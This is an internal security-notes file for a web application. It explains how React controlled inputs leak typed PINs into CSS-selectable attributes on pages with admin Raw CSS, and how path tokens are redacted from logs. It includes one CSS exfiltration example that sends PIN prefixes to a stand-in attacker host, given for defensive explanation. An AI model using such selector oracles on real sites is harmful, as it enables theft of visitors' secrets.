# Security Notes

This document captures security decisions and trade-offs that are too
implementation-specific for `SECURITY.md` at the repository root. The
root `SECURITY.md` covers the public reporting policy; this file
captures internal mitigations and operator-facing rationale.

## Secret entry on pages that carry Raw CSS

Audience: Developer, Agent.

### The rule

**A user-entered secret on a page that injects administrator Raw CSS must never
be represented in a CSS-selectable DOM attribute, or in any other
selector-readable DOM metadata, while the secret is live.** The element's `value`
*property* may hold what the browser needs in order to submit; a stylesheet
selector must not be able to recover it.

Use `SecretInput` (`src/components/ui/secret-input.tsx`) for such a field. Do not
solve it by filtering CSS selectors, and do not move the secret to `data-*`,
`aria-*`, a hidden field or `title` — those are selectable too.

### Context

`(website)` and `(website-dynamic)` render `WebsiteChrome`, which injects
`buildClubThemeCss()` output — and that build appends the club's `rawCss` from
Admin > Site Appearance. Every other shell injects `buildClubThemeAppCss()`,
which excludes it by design. A styling administrator is deliberately **outside**
the trust boundary of a kiosk PIN or a bearer token, which is the same boundary
#2827 drew for the group-join payment token.

React's controlled-input pattern breaks that boundary. On every update `react-dom`
writes `node.defaultValue`, and `defaultValue` reflects to the `value` **content
attribute** — so a controlled input publishes what the visitor has typed to any
selector on the page:

```css
input#hut-leader-pin[value^="14"] { background: url(https://attacker.example/14); }
```

Measured in real browsers on 14 Sep 2026 before any fix was written, because
jsdom is not evidence about a browser: with React 19.2.8, **Chromium 153,
Firefox 155 and WebKit 26.6 all mirrored every keystroke into the attribute**,
each growing `[value^="…"]` prefix matched, and `getComputedStyle` confirmed the
CSS engine applied the matched rule. Full evidence matrix: issue #2981.

### Mitigation

`SecretInput` renders an **uncontrolled** input: neither `value` nor
`defaultValue` reaches the element, so `react-dom` never writes `defaultValue`
and no `value` attribute exists at any point. Both props are removed by the type,
so passing one is a compile error rather than a lint rule, and stripped at
runtime so an untyped spread cannot reinstate the leak. Input filtering runs
against the element's own property instead of being fed back as a prop.

### What keeps it true

- `e2e/raw-css-secret-reflection.spec.ts` — the runtime pin. It seeds real Raw
  CSS containing the oracle rules, types a known PIN into the real page, and
  fails if the attribute, a prefix selector or the computed style ever reveals a
  character. This half cannot be replaced by a source scan.
- `src/lib/__tests__/raw-css-secret-input-census.test.ts` — the static half: which
  route groups inject Raw CSS, which credential fields exist on them, and that
  `SecretInput` still passes no value into the DOM.

### Scope

Bounded to credential-bearing fields — PIN/passcode, passwords, bearer/invite/
access tokens, API keys — on the Raw-CSS page groups. Ordinary text fields (a
name, an email) are not in scope: they are not secrets the styling administrator
sits outside the boundary for. Known limits that are **not** closed by this and
were judged acceptable: `:placeholder-shown` still reveals whether a field is
empty, and `:valid`/`:invalid` still reveal whether it satisfies its `pattern`.
Neither is character-wise and neither recovers the secret.

## Token-bearing URL paths

### Context

Some emailed confirmation and payment links carry 256-bit tokens in URL paths:

```
https://<host>/membership-cancellation/<token>
https://<host>/chores/<token>
https://<host>/nominations/<token>
https://<host>/pay/<token>
https://<host>/booking-requests/verify/<token>
```

URL paths are routinely captured by:

- Next.js / Node access logs
- Reverse-proxy logs (Caddy, in our deployment topology)
- Sentry and any other observability tooling that captures request
  metadata
- Browser history
- The `Referer` header of any outbound link click from the confirmation
  page

### Residual risk

Some token routes are also session-bound; others are intentionally public
opaque-token flows. A stolen public payment, chore, nomination, or booking
request verification token can act as the bearer credential for that specific
workflow until it is used, revoked, or expires.

### Mitigation

The shared text redaction layer (`src/lib/redact-sensitive-json.ts`)
strips the token segment from any supported token-bearing path before the
value is emitted by the Pino logger or attached to an `err` payload. This
covers structured request logs, captured error stacks, URL-encoded login
callback paths, and any other observability surface that flows through
`redactSensitiveText`.

The token remains in clear text in the email body sent to the participant or
requester, which is the only place they need it.

### Operator checklist

When reviewing observability dashboards or proxy access logs that are
exported outside of the application process, confirm that the source
also redacts these token-bearing path segments. The application-level
redaction does not protect logs that the application does not emit.
